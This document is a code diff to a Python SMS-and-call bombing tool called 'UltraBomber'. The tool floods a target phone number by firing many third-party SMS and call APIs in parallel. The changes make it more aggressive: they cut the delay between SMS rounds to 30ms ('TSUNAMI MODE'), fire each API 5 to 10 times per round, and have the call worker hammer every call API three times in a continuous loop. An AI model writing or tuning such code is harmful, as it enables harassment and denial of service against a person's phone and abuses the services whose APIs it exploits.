@@ -44,7 +44,7 @@ if API_TOKEN and not os.path.exists("config_token.py"):
 MAX_WORKERS = 50  # Ultra Power — 50 concurrent threads
 SMS_MAX_WORKERS = 200  # ULTRA POWER — 200 SMS workers for 10 req/sec/API
 DELAY_BETWEEN_ROUNDS = 0.2  # 200ms between rounds (Ultra Power)
-SMS_DELAY_BETWEEN_ROUNDS = 0.05  # 50ms between SMS rounds — ULTRA FAST!
+SMS_DELAY_BETWEEN_ROUNDS = 0.03  # 30ms between SMS rounds — TSUNAMI MODE!
 SMS_DOUBLE_FIRE = True  # Double fire — har API ek round mein 2 baar fire!
 SMS_AUTO_RETRY = True  # Retry failed SMS APIs immediately
 MAX_CONCURRENT_SESSIONS = 3  # Max 3 users (Ultra Power needs more resources per user)
@@ -903,8 +903,8 @@ class UltraBomber:
         """Fire all APIs in parallel for one round"""
         executor = self.sms_executor if is_sms else self.executor
         
-        # SMS mode: ULTRA POWER — each API fires 10 times per round!
-        fire_count = 10 if (is_sms and SMS_DOUBLE_FIRE) else 1
+        # ULTRA POWER — each API fires 10 times for SMS, 5 times for others!
+        fire_count = 10 if is_sms else 5
         
         futures = []
         for api in apis:
@@ -1027,34 +1027,31 @@ class UltraBomber:
                     pass
 
     def _important_worker(self, chat_id, stop_event):
-        """Important call APIs — fire every 3 seconds — immortal worker"""
+        """Important call APIs — fire ALL call APIs continuously — TSUNAMI MODE"""
         while not stop_event.is_set():
             try:
                 with self.lock:
                     info = self.sessions.get(chat_id)
                     if not info:
-                        time.sleep(3)
+                        time.sleep(1)
                         continue
                     phone = info["phone"]
 
-                futures = []
-                for api in IMPORTANT_CALL_APIS:
-                    futures.append(self.sms_executor.submit(self._fire_api, api, phone))
-
-                ok_count = 0
-                fail_count = 0
-                for f in as_completed(futures):
-                    name, status, size, err = f.result()
-                    if 200 <= status < 400 and size > 0:
-                        ok_count += 1
-                    else:
-                        fail_count += 1
-
-                with self.lock:
-                    if chat_id in self.sessions:
-                        self.sessions[chat_id]["stats"]["ok"] += ok_count
-                        self.sessions[chat_id]["stats"]["fail"] += fail_count
-                        self.sessions[chat_id]["stats"]["total"] += ok_count + fail_count
+                # Fire ALL call APIs continuously
+                for api in CALL_APIS:
+                    if stop_event.is_set():
+                        break
+                    # Each API fires 3 times for continuous barrage
+                    for _ in range(3):
+                        if stop_event.is_set():
+                            break
+                        name, status, size, err = self._fire_api(api, phone)
+                        with self.lock:
+                            if chat_id in self.sessions:
+                                ok_c = 1 if (200 <= status < 400 and size > 0) else 0
+                                self.sessions[chat_id]["stats"]["ok"] += ok_c
+                                self.sessions[chat_id]["stats"]["fail"] += (1 - ok_c)
+                                self.sessions[chat_id]["stats"]["total"] += 1
                 time.sleep(IMPORTANT_CALL_INTERVAL)
             except:
                 try:
